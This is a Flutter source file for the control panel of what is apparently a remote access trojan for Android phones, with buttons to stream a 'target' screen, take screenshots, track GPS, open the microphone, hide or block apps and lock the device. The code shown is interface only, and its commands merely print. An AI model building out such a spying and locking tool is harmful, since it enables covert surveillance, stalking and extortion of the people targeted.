import 'package:flutter/material.dart';
import 'chat_screen.dart';
import 'blocked_apps_screen.dart';
import 'lock_device_screen.dart';
import 'microphone_screen.dart';
import 'gps_tracker_screen.dart';

class RatControlScreen extends StatefulWidget {
  const RatControlScreen({super.key});

  @override
  State<RatControlScreen> createState() => _RatControlScreenState();
}

class _RatControlScreenState extends State<RatControlScreen> {
  bool _isFlashlightOn = false;
  bool _isLiveScreenOn = false;
  bool _isHideAppsOn = false;
  bool _isLockDeviceOn = false;
  bool _isScreenshotOn = false;

  @override
  Widget build(BuildContext context) {
    return SingleChildScrollView(
      padding: const EdgeInsets.all(16),
      child: Column(
        children: [
          _buildCard(title: 'LIVE SCREEN STREAMING', icon: Icons.live_tv, onTap: () => _showLiveStreamDialog()),
          const SizedBox(height: 16),
          _buildSwitchCard(title: 'SCREENSHOT', icon: Icons.screenshot, value: _isScreenshotOn, onChanged: (value) { setState(() => _isScreenshotOn = value); _sendCommand('screenshot', value); if (value) _showScreenshotDialog(); }),
          const SizedBox(height: 16),
          _buildCardWithArrow(title: 'GPS TRACKER', icon: Icons.gps_fixed, onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const GpsTrackerScreen()))),
          const SizedBox(height: 16),
          _buildCardWithArrow(title: 'MICROPHONE', icon: Icons.mic, onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const MicrophoneScreen()))),
          const SizedBox(height: 16),
          Row(children: [
            Expanded(child: _buildCardWithArrow(title: 'LOCK DEVICE', icon: Icons.lock, onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const LockDeviceScreen())))),
            const SizedBox(width: 16),
            Expanded(child: _buildSwitchCard(title: 'FLASHLIGHT', icon: Icons.flashlight_on, value: _isFlashlightOn, onChanged: (value) { setState(() => _isFlashlightOn = value); _sendCommand('flashlight', value); })),
          ]),
          const SizedBox(height: 16),
          Row(children: [
            Expanded(child: _buildSwitchCard(title: 'LIVE SCREEN HP', icon: Icons.screen_share, value: _isLiveScreenOn, onChanged: (value) { setState(() => _isLiveScreenOn = value); _sendCommand('live_screen', value); })),
            const SizedBox(width: 16),
            Expanded(child: _buildCardWithArrow(title: 'CHAT DENGAN TARGET', icon: Icons.chat, onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const ChatScreen())))),
          ]),
          const SizedBox(height: 16),
          _buildCardWithArrow(title: 'BLOKIR APP TARGET', icon: Icons.block, onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const BlockedAppsScreen()))),
          const SizedBox(height: 16),
          Row(children: [
            Expanded(child: _buildSwitchCard(title: 'HIDE APPS', icon: Icons.hide_source, value: _isHideAppsOn, onChanged: (value) { setState(() => _isHideAppsOn = value); _sendCommand('hide_apps', value); })),
            const SizedBox(width: 16),
            Expanded(child: _buildSwitchCard(title: 'LOCK DEVICE BIASA', icon: Icons.lock_outline, value: _isLockDeviceOn, onChanged: (value) { setState(() => _isLockDeviceOn = value); _sendCommand('lock_normal', value); })),
          ]),
          const SizedBox(height: 16),
          _buildExitCard(),
        ],
      ),
    );
  }

  Widget _buildCard({required String title, required IconData icon, required VoidCallback onTap}) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        width: double.infinity,
        padding: const EdgeInsets.all(20),
        decoration: BoxDecoration(color: const Color(0xFF2A2A3E), borderRadius: BorderRadius.circular(16), border: Border.all(color: const Color(0xFF3949AB).withOpacity(0.3))),
        child: Column(children: [Icon(icon, color: const Color(0xFF3949AB), size: 40), const SizedBox(height: 12), Text(title, style: const TextStyle(color: Colors.white, fontSize: 14, fontWeight: FontWeight.w600), textAlign: TextAlign.center)]),
      ),
    );
  }

  Widget _buildCardWithArrow({required String title, required IconData icon, required VoidCallback onTap}) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(color: const Color(0xFF2A2A3E), borderRadius: BorderRadius.circular(16), border: Border.all(color: const Color(0xFF3949AB).withOpacity(0.3))),
        child: Row(children: [Icon(icon, color: const Color(0xFF3949AB), size: 24), const SizedBox(width: 12), Expanded(child: Text(title, style: const TextStyle(color: Colors.white, fontSize: 14, fontWeight: FontWeight.w500))), const Icon(Icons.chevron_right, color: Colors.white54)]),
      ),
    );
  }

  Widget _buildSwitchCard({required String title, required IconData icon, required bool value, required Function(bool) onChanged}) {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(color: const Color(0xFF2A2A3E), borderRadius: BorderRadius.circular(16), border: Border.all(color: const Color(0xFF3949AB).withOpacity(0.3))),
      child: Row(children: [Icon(icon, color: const Color(0xFF3949AB), size: 24), const SizedBox(width: 12), Expanded(child: Text(title, style: const TextStyle(color: Colors.white, fontSize: 12, fontWeight: FontWeight.w500))), Switch(value: value, onChanged: onChanged, activeColor: const Color(0xFF3949AB))]),
    );
  }

  Widget _buildExitCard() {
    return Container(
      width: double.infinity,
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(color: const Color(0xFF2A2A3E), borderRadius: BorderRadius.circular(16), border: Border.all(color: Colors.red.withOpacity(0.3))),
      child: Row(children: [
        const Icon(Icons.exit_to_app, color: Colors.red, size: 24),
        const SizedBox(width: 12),
        Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [const Text('EXIT LOCKED DEVICE', style: TextStyle(color: Colors.red, fontSize: 14, fontWeight: FontWeight.bold)), Text('CUSTOM LOCKER • CUSTOM PIN', style: TextStyle(color: Colors.white.withOpacity(0.5), fontSize: 10))])),
        Checkbox(value: false, onChanged: (value) {}, activeColor: Colors.red),
        const Text('KUNCI DEVICE', style: TextStyle(color: Colors.white70, fontSize: 10)),
      ]),
    );
  }

  void _sendCommand(String command, bool value) { print('Command: $command, Value: $value'); }

  void _showLiveStreamDialog() {
    showDialog(context: context, builder: (context) => Dialog(
      backgroundColor: const Color(0xFF2A2A3E),
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
      child: Container(padding: const EdgeInsets.all(24), child: Column(mainAxisSize: MainAxisSize.min, children: [
        const Icon(Icons.live_tv, color: Color(0xFF3949AB), size: 50),
        const SizedBox(height: 16),
        const Text('LIVE STREAMING', style: TextStyle(color: Colors.white, fontSize: 18, fontWeight: FontWeight.bold)),
        const SizedBox(height: 16),
        Container(height: 300, width: double.infinity, color: Colors.black, child: const Center(child: Text('Streaming Screen Target', style: TextStyle(color: Colors.white54)))),
        const SizedBox(height: 16),
        ElevatedButton(onPressed: () => Navigator.pop(context), style: ElevatedButton.styleFrom(backgroundColor: const Color(0xFF3949AB), shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12))), child: const Text('TUTUP')),
      ])),
    ));
  }

  void _showScreenshotDialog() {
    showDialog(context: context, builder: (context) => Dialog(
      backgroundColor: const Color(0xFF2A2A3E),
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
      child: Container(padding: const EdgeInsets.all(24), child: Column(mainAxisSize: MainAxisSize.min, children: [
        const Icon(Icons.screenshot, color: Color(0xFF3949AB), size: 50),
        const SizedBox(height: 16),
        const Text('SCREENSHOT CAPTURED', style: TextStyle(color: Colors.white, fontSize: 18, fontWeight: FontWeight.bold)),
        const SizedBox(height: 16),
        Container(height: 200, width: double.infinity, color: Colors.black, child: const Center(child: Text('Screenshot dari target akan muncul di sini', style: TextStyle(color: Colors.white54)))),
        const SizedBox(height: 16),
        Row(children: [
          Expanded(child: ElevatedButton(onPressed: () { setState(() => _isScreenshotOn = false); Navigator.pop(context); }, style: ElevatedButton.styleFrom(backgroundColor: Colors.red, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12))), child: const Text('MATIKAN'))),
          const SizedBox(width: 12),
          Expanded(child: ElevatedButton(onPressed: () => Navigator.pop(context), style: ElevatedButton.styleFrom(backgroundColor: const Color(0xFF3949AB), shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12))), child: const Text('SIMPAN'))),
        ]),
      ])),
    ));
  }
}